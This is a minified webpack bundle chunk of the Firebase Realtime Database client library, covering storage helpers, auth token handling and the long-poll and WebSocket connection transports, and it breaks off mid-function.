"use strict";
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [627],
  {
    5276: function (e, t, n) {
      let i, r, s, o, l, a, h, u, c, d, _;
      n.d(t, {
        N8: function () {
          return iR;
        },
        VF: function () {
          return ib;
        },
        iH: function () {
          return iI;
        },
        jM: function () {
          return iS;
        },
      });
      var p,
        f,
        g = n(5816),
        m = n(8463),
        y = n(4444),
        v = n(3333),
        C = n(3454);
      let w = "@firebase/database",
        T = "0.14.1",
        I = "";
      class k {
        constructor(e) {
          (this.domStorage_ = e), (this.prefix_ = "firebase:");
        }
        set(e, t) {
          null == t
            ? this.domStorage_.removeItem(this.prefixedName_(e))
            : this.domStorage_.setItem(this.prefixedName_(e), (0, y.Wl)(t));
        }
        get(e) {
          let t = this.domStorage_.getItem(this.prefixedName_(e));
          return null == t ? null : (0, y.cI)(t);
        }
        remove(e) {
          this.domStorage_.removeItem(this.prefixedName_(e));
        }
        prefixedName_(e) {
          return this.prefix_ + e;
        }
        toString() {
          return this.domStorage_.toString();
        }
      }
      class b {
        constructor() {
          (this.cache_ = {}), (this.isInMemoryStorage = !0);
        }
        set(e, t) {
          null == t ? delete this.cache_[e] : (this.cache_[e] = t);
        }
        get(e) {
          return (0, y.r3)(this.cache_, e) ? this.cache_[e] : null;
        }
        remove(e) {
          delete this.cache_[e];
        }
      }
      let E = function (e) {
          try {
            if ("undefined" != typeof window && void 0 !== window[e]) {
              let t = window[e];
              return (
                t.setItem("firebase:sentinel", "cache"),
                t.removeItem("firebase:sentinel"),
                new k(t)
              );
            }
          } catch (n) {}
          return new b();
        },
        N = E("localStorage"),
        S = E("sessionStorage"),
        P = new v.Yd("@firebase/database"),
        x =
          ((_ = 1),
          function () {
            return _++;
          }),
        R = function (e) {
          let t = (0, y.dS)(e),
            n = new y.gQ();
          n.update(t);
          let i = n.digest();
          return y.US.encodeByteArray(i);
        },
        D = function (...e) {
          let t = "";
          for (let n = 0; n < e.length; n++) {
            let i = e[n];
            Array.isArray(i) ||
            (i && "object" == typeof i && "number" == typeof i.length)
              ? (t += D.apply(null, i))
              : (t += "object" == typeof i ? (0, y.Wl)(i) : i),
              (t += " ");
          }
          return t;
        },
        M = null,
        F = !0,
        q = function (...e) {
          if (
            (!0 === F &&
              ((F = !1),
              null === M &&
                !0 === S.get("logging_enabled") &&
                (function (e, t) {
                  (0, y.hu)(
                    !t || !0 === e || !1 === e,
                    "Can't turn on custom loggers persistently."
                  ),
                    !0 === e
                      ? ((P.logLevel = v.in.VERBOSE),
                        (M = P.log.bind(P)),
                        t && S.set("logging_enabled", !0))
                      : "function" == typeof e
                      ? (M = e)
                      : ((M = null), S.remove("logging_enabled"));
                })(!0)),
            M)
          ) {
            let t = D.apply(null, e);
            M(t);
          }
        },
        L = function (e) {
          return function (...t) {
            q(e, ...t);
          };
        },
        O = function (...e) {
          let t = "FIREBASE INTERNAL ERROR: " + D(...e);
          P.error(t);
        },
        W = function (...e) {
          let t = `FIREBASE FATAL ERROR: ${D(...e)}`;
          throw (P.error(t), Error(t));
        },
        U = function (...e) {
          let t = "FIREBASE WARNING: " + D(...e);
          P.warn(t);
        },
        Y = function (e) {
          return (
            "number" == typeof e &&
            (e != e ||
              e === Number.POSITIVE_INFINITY ||
              e === Number.NEGATIVE_INFINITY)
          );
        },
        V = "[MIN_NAME]",
        z = "[MAX_NAME]",
        B = function (e, t) {
          if (e === t) return 0;
          if (e === V || t === z) return -1;
          if (t === V || e === z) return 1;
          {
            let n = ee(e),
              i = ee(t);
            return null !== n
              ? null !== i
                ? n - i == 0
                  ? e.length - t.length
                  : n - i
                : -1
              : null !== i
              ? 1
              : e < t
              ? -1
              : 1;
          }
        },
        K = function (e, t) {
          return e === t ? 0 : e < t ? -1 : 1;
        },
        G = function (e, t) {
          if (t && e in t) return t[e];
          throw Error(
            "Missing required key (" + e + ") in object: " + (0, y.Wl)(t)
          );
        },
        $ = function (e) {
          if ("object" != typeof e || null === e) return (0, y.Wl)(e);
          let t = [];
          for (let n in e) t.push(n);
          t.sort();
          let i = "{";
          for (let r = 0; r < t.length; r++)
            0 !== r && (i += ","), (i += (0, y.Wl)(t[r]) + ":" + $(e[t[r]]));
          return i + "}";
        },
        Q = function (e, t) {
          let n = e.length;
          if (n <= t) return [e];
          let i = [];
          for (let r = 0; r < n; r += t)
            r + t > n
              ? i.push(e.substring(r, n))
              : i.push(e.substring(r, r + t));
          return i;
        };
      function X(e, t) {
        for (let n in e) e.hasOwnProperty(n) && t(n, e[n]);
      }
      let J = function (e) {
          let t, n, i, r, s;
          (0, y.hu)(!Y(e), "Invalid JSON number"),
            0 === e
              ? ((n = 0), (i = 0), (t = 1 / e == -1 / 0 ? 1 : 0))
              : ((t = e < 0),
                (e = Math.abs(e)) >= 22250738585072014e-324
                  ? ((n =
                      (r = Math.min(Math.floor(Math.log(e) / Math.LN2), 1023)) +
                      1023),
                    (i = Math.round(
                      e * Math.pow(2, 52 - r) - 4503599627370496
                    )))
                  : ((n = 0), (i = Math.round(e / 5e-324))));
          let o = [];
          for (s = 52; s; s -= 1)
            o.push(i % 2 ? 1 : 0), (i = Math.floor(i / 2));
          for (s = 11; s; s -= 1)
            o.push(n % 2 ? 1 : 0), (n = Math.floor(n / 2));
          o.push(t ? 1 : 0), o.reverse();
          let l = o.join(""),
            a = "";
          for (s = 0; s < 64; s += 8) {
            let h = parseInt(l.substr(s, 8), 2).toString(16);
            1 === h.length && (h = "0" + h), (a += h);
          }
          return a.toLowerCase();
        },
        Z = RegExp("^-?(0*)\\d{1,10}$"),
        ee = function (e) {
          if (Z.test(e)) {
            let t = Number(e);
            if (t >= -2147483648 && t <= 2147483647) return t;
          }
          return null;
        },
        et = function (e) {
          try {
            e();
          } catch (t) {
            setTimeout(() => {
              let e = t.stack || "";
              throw (U("Exception was thrown by user callback.", e), t);
            }, Math.floor(0));
          }
        },
        ei = function (e, t) {
          let n = setTimeout(e, t);
          return (
            "number" == typeof n &&
            "undefined" != typeof Deno &&
            Deno.unrefTimer
              ? Deno.unrefTimer(n)
              : "object" == typeof n && n.unref && n.unref(),
            n
          );
        };
      class er {
        constructor(e, t) {
          (this.appName_ = e),
            (this.appCheckProvider = t),
            (this.appCheck =
              null == t ? void 0 : t.getImmediate({ optional: !0 })),
            this.appCheck ||
              null == t ||
              t.get().then((e) => (this.appCheck = e));
        }
        getToken(e) {
          return this.appCheck
            ? this.appCheck.getToken(e)
            : new Promise((t, n) => {
                setTimeout(() => {
                  this.appCheck ? this.getToken(e).then(t, n) : t(null);
                }, 0);
              });
        }
        addTokenChangeListener(e) {
          var t;
          null === (t = this.appCheckProvider) ||
            void 0 === t ||
            t.get().then((t) => t.addTokenListener(e));
        }
        notifyForInvalidToken() {
          U(
            `Provided AppCheck credentials for the app named "${this.appName_}" are invalid. This usually indicates your app was not initialized correctly.`
          );
        }
      }
      class es {
        constructor(e, t, n) {
          (this.appName_ = e),
            (this.firebaseOptions_ = t),
            (this.authProvider_ = n),
            (this.auth_ = null),
            (this.auth_ = n.getImmediate({ optional: !0 })),
            this.auth_ || n.onInit((e) => (this.auth_ = e));
        }
        getToken(e) {
          return this.auth_
            ? this.auth_
                .getToken(e)
                .catch((e) =>
                  e && "auth/token-not-initialized" === e.code
                    ? (q(
                        "Got auth/token-not-initialized error.  Treating as null token."
                      ),
                      null)
                    : Promise.reject(e)
                )
            : new Promise((t, n) => {
                setTimeout(() => {
                  this.auth_ ? this.getToken(e).then(t, n) : t(null);
                }, 0);
              });
        }
        addTokenChangeListener(e) {
          this.auth_
            ? this.auth_.addAuthTokenListener(e)
            : this.authProvider_.get().then((t) => t.addAuthTokenListener(e));
        }
        removeTokenChangeListener(e) {
          this.authProvider_.get().then((t) => t.removeAuthTokenListener(e));
        }
        notifyForInvalidToken() {
          let e =
            'Provided authentication credentials for the app named "' +
            this.appName_ +
            '" are invalid. This usually indicates your app was not initialized correctly. ';
          "credential" in this.firebaseOptions_
            ? (e +=
                'Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.')
            : "serviceAccount" in this.firebaseOptions_
            ? (e +=
                'Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.')
            : (e +=
                'Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.'),
            U(e);
        }
      }
      class eo {
        constructor(e) {
          this.accessToken = e;
        }
        getToken(e) {
          return Promise.resolve({ accessToken: this.accessToken });
        }
        addTokenChangeListener(e) {
          e(this.accessToken);
        }
        removeTokenChangeListener(e) {}
        notifyForInvalidToken() {}
      }
      eo.OWNER = "owner";
      let el =
          /(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,
        ea = "websocket",
        eh = "long_polling";
      class eu {
        constructor(e, t, n, i, r = !1, s = "", o = !1) {
          (this.secure = t),
            (this.namespace = n),
            (this.webSocketOnly = i),
            (this.nodeAdmin = r),
            (this.persistenceKey = s),
            (this.includeNamespaceInQueryParams = o),
            (this._host = e.toLowerCase()),
            (this._domain = this._host.substr(this._host.indexOf(".") + 1)),
            (this.internalHost = N.get("host:" + e) || this._host);
        }
        isCacheableHost() {
          return "s-" === this.internalHost.substr(0, 2);
        }
        isCustomHost() {
          return (
            "firebaseio.com" !== this._domain &&
            "firebaseio-demo.com" !== this._domain
          );
        }
        get host() {
          return this._host;
        }
        set host(e) {
          e !== this.internalHost &&
            ((this.internalHost = e),
            this.isCacheableHost() &&
              N.set("host:" + this._host, this.internalHost));
        }
        toString() {
          let e = this.toURLString();
          return (
            this.persistenceKey && (e += "<" + this.persistenceKey + ">"), e
          );
        }
        toURLString() {
          let e = this.secure ? "https://" : "http://",
            t = this.includeNamespaceInQueryParams
              ? `?ns=${this.namespace}`
              : "";
          return `${e}${this.host}/${t}`;
        }
      }
      function ec(e, t, n) {
        let i;
        if (
          ((0, y.hu)("string" == typeof t, "typeof type must == string"),
          (0, y.hu)("object" == typeof n, "typeof params must == object"),
          t === ea)
        )
          i = (e.secure ? "wss://" : "ws://") + e.internalHost + "/.ws?";
        else {
          if (t !== eh) throw Error("Unknown connection type: " + t);
          i = (e.secure ? "https://" : "http://") + e.internalHost + "/.lp?";
        }
        (e.host !== e.internalHost ||
          e.isCustomHost() ||
          e.includeNamespaceInQueryParams) &&
          (n.ns = e.namespace);
        let r = [];
        return (
          X(n, (e, t) => {
            r.push(e + "=" + t);
          }),
          i + r.join("&")
        );
      }
      class ed {
        constructor() {
          this.counters_ = {};
        }
        incrementCounter(e, t = 1) {
          (0, y.r3)(this.counters_, e) || (this.counters_[e] = 0),
            (this.counters_[e] += t);
        }
        get() {
          return (0, y.p$)(this.counters_);
        }
      }
      let e_ = {},
        ep = {};
      function ef(e) {
        let t = e.toString();
        return e_[t] || (e_[t] = new ed()), e_[t];
      }
      class eg {
        constructor(e) {
          (this.onMessage_ = e),
            (this.pendingResponses = []),
            (this.currentResponseNum = 0),
            (this.closeAfterResponse = -1),
            (this.onClose = null);
        }
        closeAfter(e, t) {
          (this.closeAfterResponse = e),
            (this.onClose = t),
            this.closeAfterResponse < this.currentResponseNum &&
              (this.onClose(), (this.onClose = null));
        }
        handleResponse(e, t) {
          for (
            this.pendingResponses[e] = t;
            this.pendingResponses[this.currentResponseNum];

          ) {
            let n = this.pendingResponses[this.currentResponseNum];
            delete this.pendingResponses[this.currentResponseNum];
            for (let i = 0; i < n.length; ++i)
              n[i] &&
                et(() => {
                  this.onMessage_(n[i]);
                });
            if (this.currentResponseNum === this.closeAfterResponse) {
              this.onClose && (this.onClose(), (this.onClose = null));
              break;
            }
            this.currentResponseNum++;
          }
        }
      }
      class ey {
        constructor(e, t, n, i, r, s, o) {
          (this.connId = e),
            (this.repoInfo = t),
            (this.applicationId = n),
            (this.appCheckToken = i),
            (this.authToken = r),
            (this.transportSessionId = s),
            (this.lastSessionId = o),
            (this.bytesSent = 0),
            (this.bytesReceived = 0),
            (this.everConnected_ = !1),
            (this.log_ = L(e)),
            (this.stats_ = ef(t)),
            (this.urlFn = (e) => (
              this.appCheckToken && (e.ac = this.appCheckToken), ec(t, eh, e)
            ));
        }
        open(e, t) {
          (this.curSegmentNum = 0),
            (this.onDisconnect_ = t),
            (this.myPacketOrderer = new eg(e)),
            (this.isClosed_ = !1),
            (this.connectTimeoutTimer_ = setTimeout(() => {
              this.log_("Timed out trying to connect."),
                this.onClosed_(),
                (this.connectTimeoutTimer_ = null);
            }, Math.floor(3e4))),
            (function (e) {
              if ((0, y.Yr)() || "complete" === document.readyState) e();
              else {
                let t = !1,
                  n = function () {
                    document.body
                      ? t || ((t = !0), e())
                      : setTimeout(n, Math.floor(10));
                  };
                document.addEventListener
                  ? (document.addEventListener("DOMContentLoaded", n, !1),
                    window.addEventListener("load", n, !1))
                  : document.attachEvent &&
                    (document.attachEvent("onreadystatechange", () => {
                      "complete" === document.readyState && n();
                    }),
                    window.attachEvent("onload", n));
              }
            })(() => {
              if (this.isClosed_) return;
              this.scriptTagHolder = new ev(
                (...e) => {
                  let [t, n, i, r, s] = e;
                  if ((this.incrementIncomingBytes_(e), this.scriptTagHolder))
                    if (
                      (this.connectTimeoutTimer_ &&
                        (clearTimeout(this.connectTimeoutTimer_),
                        (this.connectTimeoutTimer_ = null)),
                      (this.everConnected_ = !0),
                      "start" === t)
                    )
                      (this.id = n), (this.password = i);
                    else {
                      if ("close" !== t)
                        throw Error("Unrecognized command received: " + t);
                      n
                        ? ((this.scriptTagHolder.sendNewPolls = !1),
                          this.myPacketOrderer.closeAfter(n, () => {
                            this.onClosed_();
                          }))
                        : this.onClosed_();
                    }
                },
                (...e) => {
                  let [t, n] = e;
                  this.incrementIncomingBytes_(e),
                    this.myPacketOrderer.handleResponse(t, n);
                },
                () => {
                  this.onClosed_();
                },
                this.urlFn
              );
              let e = { start: "t" };
              (e.ser = Math.floor(1e8 * Math.random())),
                this.scriptTagHolder.uniqueCallbackIdentifier &&
                  (e.cb = this.scriptTagHolder.uniqueCallbackIdentifier),
                (e.v = "5"),
                this.transportSessionId && (e.s = this.transportSessionId),
                this.lastSessionId && (e.ls = this.lastSessionId),
                this.applicationId && (e.p = this.applicationId),
                this.appCheckToken && (e.ac = this.appCheckToken),
                "undefined" != typeof location &&
                  location.hostname &&
                  el.test(location.hostname) &&
                  (e.r = "f");
              let t = this.urlFn(e);
              this.log_("Connecting via long-poll to " + t),
                this.scriptTagHolder.addTag(t, () => {});
            });
        }
        start() {
          this.scriptTagHolder.startLongPoll(this.id, this.password),
            this.addDisconnectPingFrame(this.id, this.password);
        }
        static forceAllow() {
          ey.forceAllow_ = !0;
        }
        static forceDisallow() {
          ey.forceDisallow_ = !0;
        }
        static isAvailable() {
          return !(
            (0, y.Yr)() ||
            (!ey.forceAllow_ &&
              (ey.forceDisallow_ ||
                "undefined" == typeof document ||
                null == document.createElement ||
                ("object" == typeof window &&
                  window.chrome &&
                  window.chrome.extension &&
                  !/^chrome/.test(window.location.href)) ||
                ("object" == typeof Windows && "object" == typeof Windows.UI)))
          );
        }
        markConnectionHealthy() {}
        shutdown_() {
          (this.isClosed_ = !0),
            this.scriptTagHolder &&
              (this.scriptTagHolder.close(), (this.scriptTagHolder = null)),
            this.myDisconnFrame &&
              (document.body.removeChild(this.myDisconnFrame),
              (this.myDisconnFrame = null)),
            this.connectTimeoutTimer_ &&
              (clearTimeout(this.connectTimeoutTimer_),
              (this.connectTimeoutTimer_ = null));
        }
        onClosed_() {
          !this.isClosed_ &&
            (this.log_("Longpoll is closing itself"),
            this.shutdown_(),
            this.onDisconnect_ &&
              (this.onDisconnect_(this.everConnected_),
              (this.onDisconnect_ = null)));
        }
        close() {
          this.isClosed_ ||
            (this.log_("Longpoll is being closed."), this.shutdown_());
        }
        send(e) {
          let t = (0, y.Wl)(e);
          (this.bytesSent += t.length),
            this.stats_.incrementCounter("bytes_sent", t.length);
          let n = (0, y.h$)(t),
            i = Q(n, 1840);
          for (let r = 0; r < i.length; r++)
            this.scriptTagHolder.enqueueSegment(
              this.curSegmentNum,
              i.length,
              i[r]
            ),
              this.curSegmentNum++;
        }
        addDisconnectPingFrame(e, t) {
          if ((0, y.Yr)()) return;
          this.myDisconnFrame = document.createElement("iframe");
          let n = { dframe: "t" };
          (n.id = e),
            (n.pw = t),
            (this.myDisconnFrame.src = this.urlFn(n)),
            (this.myDisconnFrame.style.display = "none"),
            document.body.appendChild(this.myDisconnFrame);
        }
        incrementIncomingBytes_(e) {
          let t = (0, y.Wl)(e).length;
          (this.bytesReceived += t),
            this.stats_.incrementCounter("bytes_received", t);
        }
      }
      class ev {
        constructor(e, t, n, i) {
          if (
            ((this.onDisconnect = n),
            (this.urlFn = i),
            (this.outstandingRequests = new Set()),
            (this.pendingSegs = []),
            (this.currentSerial = Math.floor(1e8 * Math.random())),
            (this.sendNewPolls = !0),
            (0, y.Yr)())
          )
            (this.commandCB = e), (this.onMessageCB = t);
          else {
            (this.uniqueCallbackIdentifier = x()),
              (window["pLPCommand" + this.uniqueCallbackIdentifier] = e),
              (window["pRTLPCB" + this.uniqueCallbackIdentifier] = t),
              (this.myIFrame = ev.createIFrame_());
            let r = "";
            if (
              this.myIFrame.src &&
              "javascript:" === this.myIFrame.src.substr(0, 11)
            ) {
              r = '<script>document.domain="' + document.domain + '";</script>';
            }
            let o = "<html><body>" + r + "</body></html>";
            try {
              this.myIFrame.doc.open(),
                this.myIFrame.doc.write(o),
                this.myIFrame.doc.close();
            } catch (l) {
              q("frame writing exception"), l.stack && q(l.stack), q(l);
            }
          }
        }
        static createIFrame_() {
          let e = document.createElement("iframe");
          if (((e.style.display = "none"), !document.body))
            throw "Document body has not initialized. Wait to initialize Firebase until after the document is ready.";
          document.body.appendChild(e);
          try {
            e.contentWindow.document || q("No IE domain setting required");
          } catch (i) {
            let n = document.domain;
            e.src =
              "javascript:void((function(){document.open();document.domain='" +
              n +
              "';document.close();})())";
          }
          return (
            e.contentDocument
              ? (e.doc = e.contentDocument)
              : e.contentWindow
              ? (e.doc = e.contentWindow.document)
              : e.document && (e.doc = e.document),
            e
          );
        }
        close() {
          (this.alive = !1),
            this.myIFrame &&
              ((this.myIFrame.doc.body.textContent = ""),
              setTimeout(() => {
                null !== this.myIFrame &&
                  (document.body.removeChild(this.myIFrame),
                  (this.myIFrame = null));
              }, Math.floor(0)));
          let e = this.onDisconnect;
          e && ((this.onDisconnect = null), e());
        }
        startLongPoll(e, t) {
          for (
            this.myID = e, this.myPW = t, this.alive = !0;
            this.newRequest_();

          );
        }
        newRequest_() {
          if (
            !(
              this.alive &&
              this.sendNewPolls &&
              this.outstandingRequests.size <
                (this.pendingSegs.length > 0 ? 2 : 1)
            )
          )
            return !1;
          {
            this.currentSerial++;
            let e = {};
            (e.id = this.myID),
              (e.pw = this.myPW),
              (e.ser = this.currentSerial);
            let t = this.urlFn(e),
              n = "",
              i = 0;
            for (; this.pendingSegs.length > 0; ) {
              if (!(this.pendingSegs[0].d.length + 30 + n.length <= 1870))
                break;
              {
                let s = this.pendingSegs.shift();
                (n =
                  n +
                  "&seg" +
                  i +
                  "=" +
                  s.seg +
                  "&ts" +
                  i +
                  "=" +
                  s.ts +
                  "&d" +
                  i +
                  "=" +
                  s.d),
                  i++;
              }
            }
            return (t += n), this.addLongPollTag_(t, this.currentSerial), !0;
          }
        }
        enqueueSegment(e, t, n) {
          this.pendingSegs.push({ seg: e, ts: t, d: n }),
            this.alive && this.newRequest_();
        }
        addLongPollTag_(e, t) {
          this.outstandingRequests.add(t);
          let n = () => {
              this.outstandingRequests.delete(t), this.newRequest_();
            },
            i = setTimeout(n, Math.floor(25e3));
          this.addTag(e, () => {
            clearTimeout(i), n();
          });
        }
        addTag(e, t) {
          (0, y.Yr)()
            ? this.doNodeLongPoll(e, t)
            : setTimeout(() => {
                try {
                  if (!this.sendNewPolls) return;
                  let n = this.myIFrame.doc.createElement("script");
                  (n.type = "text/javascript"),
                    (n.async = !0),
                    (n.src = e),
                    (n.onload = n.onreadystatechange =
                      function () {
                        let e = n.readyState;
                        (e && "loaded" !== e && "complete" !== e) ||
                          ((n.onload = n.onreadystatechange = null),
                          n.parentNode && n.parentNode.removeChild(n),
                          t());
                      }),
                    (n.onerror = () => {
                      q("Long-poll script failed to load: " + e),
                        (this.sendNewPolls = !1),
                        this.close();
                    }),
                    this.myIFrame.doc.body.appendChild(n);
                } catch (i) {}
              }, Math.floor(1));
        }
      }
      let eC = null;
      "undefined" != typeof MozWebSocket
        ? (eC = MozWebSocket)
        : "undefined" != typeof WebSocket && (eC = WebSocket);
      class ew {
        constructor(e, t, n, i, r, s, o) {
          (this.connId = e),
            (this.applicationId = n),
            (this.appCheckToken = i),
            (this.authToken = r),
            (this.keepaliveTimer = null),
            (this.frames = null),
            (this.totalFrames = 0),
            (this.bytesSent = 0),
            (this.bytesReceived = 0),
            (this.log_ = L(this.connId)),
            (this.stats_ = ef(t)),
            (this.connURL = ew.connectionURL_(t, s, o, i, n)),
            (this.nodeAdmin = t.nodeAdmin);
        }
        static connectionURL_(e, t, n, i, r) {
          let s = { v: "5" };
          return (
            !(0, y.Yr)() &&
              "undefined" != typeof location &&
              location.hostname &&
              el.test(location.hostname) &&
              (s.r = "f"),
            t && (s.s = t),
            n && (s.ls = n),
            i && (s.ac = i),
            r && (s.p = r),
            ec(e, ea, s)
          );
        }
        open(e, t) {
          (this.onDisconnect = t),
            (this.onMessage = e),
            this.log_("Websocket connecting to " + this.connURL),
            (this.everConnected_ = !1),
            N.set("previous_websocket_failure", !0);
          try {
            let n;
            if ((0, y.Yr)()) {
              let i = this.nodeAdmin ? "AdminNode" : "Node";
              (n = {
                headers: {
                  "User-Agent": `Firebase/5/${I}/${C.platform}/${i}`,
                  "X-Firebase-GMPID": this.applicationId || "",
                },
              }),
                this.authToken &&
                  (n.headers.Authorization = `Bearer ${this.authToken}`),
                this.appCheckToken &&
                  (n.headers["X-Firebase-AppCheck"] = this.appCheckToken);
              let r = C.env,
                s =
                  0 === this.connURL.indexOf("wss://")
                    ? r.HTTPS_PROXY || r.https_proxy
                    : r.HTTP_PROXY || r.http_proxy;
              s && (n.proxy = { origin: s });
            }
            this.mySock = new eC(this.connURL, [], n);
          } catch (l) {
            this.log_("Error instantiating WebSocket.");
            let o = l.message || l.data;
            return o && this.log_(o), void this.onClosed_();
          }
          (this.mySock.onopen = () => {
            this.log_("Websocket connected."), (this.everConnected_ = !0);
          }),
            (this.mySock.onclose = () => {
              this.log_("Websocket connection was disconnected."),
                (this.mySock = null),
                this.onClosed_();
            }),
            (this.mySock.onmessage = (e) => {
              this.handleIncomingFrame(e);
            }),
            (this.mySock.onerror = (e) => {
              this.log_("WebSocket error.  Closing connection.");
              let t = e.message || e.data;
              t && this.log_(t), this.onClosed_();
            });
        }
        start() {}
        static forceDisallow() {
          ew.forceDisallow_ = !0;
        }
        static isAvailable() {
          let e = !1;
          if ("undefined" != typeof navigator && navigator.userAgent) {
            let t = navigator.userAgent.match(/Android ([0-9]{0,}\.[0-9]{0,})/);
            t && t.length > 1 && 4.4 > parseFloat(t[1]) && (e = !0);
          }
          return !e && null !== eC && !ew.forceDisallow_;
        }
        static previouslyFailed() {
          return (
            N.isInMemoryStorage || !0 === N.get("previous_websocket_failure")
          );
        }
        markConnectionHealthy() {
          N.remove("previous_websocket_failure");
        }
        appendFrame_(e) {
          if ((this.frames.push(e), this.frames.length === this.totalFrames)) {
            let t = this.frames.join("");
            this.frames = null;
            let n = (0, y.cI)(t);
            this.onMessage(n);
          }
        }
        handleNewFrameCount_(e) {
          (this.totalFrames = e), (this.frames = []);
        }
        extractFrameCount_(e) {
          if (
            ((0, y.hu)(null === this.frames, "We already have a frame buffer"),
            e.length <= 6)
          ) {
            let t = Number(e);
            if (!isNaN(t)) return this.handleNewFrameCount_(t), null;
          }
          return this.handleNewFrameCount_(1), e;
        }
        handleIncomingFrame(e) {
          if (null === this.mySock) return;
          let t = e.data;
          if (
            ((this.bytesReceived += t.length),
            this.stats_.incrementCounter("bytes_received", t.length),
            this.resetKeepAlive(),
            null !== this.frames)
          )
            this.appendFrame_(t);
          else {
            let n = this.extractFrameCount_(t);
            null !== n && this.appendFrame_(n);
          }
        }
        send(e) {
          this.resetKeepAlive();
          let t = (0, y.Wl)(e);
          (this.bytesSent += t.length),
            this.stats_.incrementCounter("bytes_sent", t.length);
          let n = Q(t, 16384);
          n.length > 1 && this.sendString_(String(n.length));
          for (let i = 0; i < n.length; i++) this.sendString_(n[i]);
        }
        shutdown_() {
          (this.isClosed_ = !0),
            this.keepaliveTimer &&
              (clearInterval(this.keepaliveTimer),
              (this.keepaliveTimer = null)),
            this.mySock && (this.mySock.close(), (this.mySock = null));
        }
        onClosed_() {
          !this.isClosed_ &&
            (this.log_("WebSocket is closing itself"),
            this.shutdown_(),
            this.onDisconnect &&
              (this.onDisconnect(this.everConnected_),
              (this.onDisconnect = null)));
        }
        close() {
          this.isClosed_ ||
            (this.log_("WebSocket is being closed"), this.shutdown_());
        }
        resetKeepAlive() {
          clearInterval(this.keepaliveTimer),
            (this.keepaliveTimer = setInterval(() => {
              this.mySock && this.sendString_("0"), this.resetKeepAlive();
            }, Math.floor(45e3)));
        }
        sendString_(e) {
          try {
            this.mySock.send(e);
          } catch (t) {
            this.log_(
              "Exception thrown from WebSocket.send():",
              t.message || t.data,
              "Closing connection."
            ),
              setTimeout(this.onClosed_.bind(this), 0);
          }
        }
      }
      (ew.responsesRequiredToBeHealthy = 2), (ew.healthyTimeout = 3e4);
      class eT {
        constructor(e) {
          this.initTransports_(e);
        }
        static get ALL_TRANSPORTS() {
          return [ey, ew];
        }
        static get IS_TRANSPORT_INITIALIZED() {
          return this.globalTransportInitialized_;
        }
        initTransports_(e) {
          let t = ew && ew.isAvailable(),
            n = t && !ew.previouslyFailed();
          if (
            (e.webSocketOnly &&
              (t ||
                U(
                  "wss:// URL used, but browser isn't known to support websockets.  Trying anyway."
                ),
              (n = !0)),
            n)
          )
            this.transports_ = [ew];
          else {
            let i = (this.transports_ = []);
            for (let r of eT.ALL_TRANSPORTS) r && r.isAvailable() && i.push(r);
            eT.globalTransportInitialized_ = !0;
          }
        }
        initialTransport() {
          if (this.transports_.length > 0) return this.transports_[0];
          throw Error("No transports available");
        }
        upgradeTransport() {
          return this.transports_.length > 1 ? this.transports_[1] : null;
        }
      }
      eT.globalTransportInitialized_ = !1;
      class eI {
        constructor(e, t, n, i, r, s, o, l, a, h) {
          (this.id = e),
            (this.repoInfo_ = t),
            (this.applicationId_ = n),
            (this.appCheckToken_ = i),
            (this.authToken_ = r),
            (this.onMessage_ = s),
            (this.onReady_ = o),
            (this.onDisconnect_ = l),
            (this.onKill_ = a),
            (this.lastSessionId = h),
            (this.connectionCount = 0),
            (this.pendingDataMessages = []),
            (this.state_ = 0),
            (this.log_ = L("c:" + this.id + ":")),
            (this.transportManager_ = new eT(t)),
            this.log_("Connection created"),
            this.start_();
        }
        start_() {
          let e = this.transportManager_.initialTransport();
          (this.conn_ = new e(
            this.nextTransportId_(),
            this.repoInfo_,
            this.applicationId_,
            this.appCheckToken_,
            this.authToken_,
            null,
            this.lastSessionId
          )),
            (this.primaryResponsesRequired_ =
              e.responsesRequiredToBeHealthy || 0);
          let t = this.connReceiver_(this.conn_),
            n = this.disconnReceiver_(this.conn_);
          (this.tx_ = this.conn_),
            (this.rx_ = this.conn_),
            (this.secondaryConn_ = null),
            (this.isHealthy_ = !1),
            setTimeout(() => {
              this.conn_ && this.conn_.open(t, n);
            }, Math.floor(0));
          let i = e.healthyTimeout || 0;
          i > 0 &&
            (this.healthyTimeout_ = ei(() => {
              (this.healthyTimeout_ = null),
                this.isHealthy_ ||
                  (this.conn_ && this.conn_.bytesReceived > 102400
                    ? (this.log_(
                        "Connection exceeded healthy timeout but has received " +
                          this.conn_.bytesReceived +
                          " bytes.  Marking connection healthy."
                      ),
                      (this.isHealthy_ = !0),
                      this.conn_.markConnectionHealthy())
                    : this.conn_ && this.conn_.bytesSent > 10240
                    ? this.log_(
                        "Connection exceeded healthy timeout but has sent " +
                          this.conn_.bytesSent +
                          " bytes.  Leaving connection alive."
                      )
                    : (this.log_("Closing unhealthy connection after timeout."),
                      this.close()));
            }, Math.floor(i)));
        }
        nextTransportId_() {
          return "c:" + this.id + ":" + this.connectionCount++;
        }
        disconnReceiver_(e) {
          return (t) => {
            e === this.conn_
              ? this.onConnectionLost_(t)
              : e === this.secondaryConn_
              ? (this.log_("Secondary connection lost."),
                this.onSecondaryConnectionLost_())
              : this.log_("closing an old connection");
          };
        }
        connReceiver_(e) {
          return (t) => {
            2 !== this.state_ &&
              (e === this.rx_
                ? this.onPrimaryMessageReceived_(t)
                : e === this.secondaryConn_
                ? this.onSecondaryMessageReceived_(t)
                : this.log_("message on old connection"));
          };
        }
        sendRequest(e) {
          this.sendData_({ t: "d", d: e });
        }
        tryCleanupConnection() {
          this.tx_ === this.secondaryConn_ &&
            this.rx_ === this.secondaryConn_ &&
            (this.log_(
              "cleaning up and promoting a connection: " +
                this.secondaryConn_.connId
            ),
            (this.conn_ = this.secondaryConn_),
            (this.secondaryConn_ = null));
        }
        onSecondaryControl_(e) {
          if ("t" in e) {
            let t = e.t;
            "a" === t
              ? this.upgradeIfSecondaryHealthy_()
              : "r" === t
              ? (this.log_("Got a reset on secondary, closing it"),
                this.secondaryConn_.close(),
                (this.tx_ === this.secondaryConn_ ||
                  this.rx_ === this.secondaryConn_) &&
                  this.close())
              : "o" === t &&
                (this.log_("got pong on secondary."),
                this.secondaryResponsesRequired_--,
                this.upgradeIfSecondaryHealthy_());
          }
        }
        onSecondaryMessageReceived_(e) {
          let t = G("t", e),
            n = G("d", e);
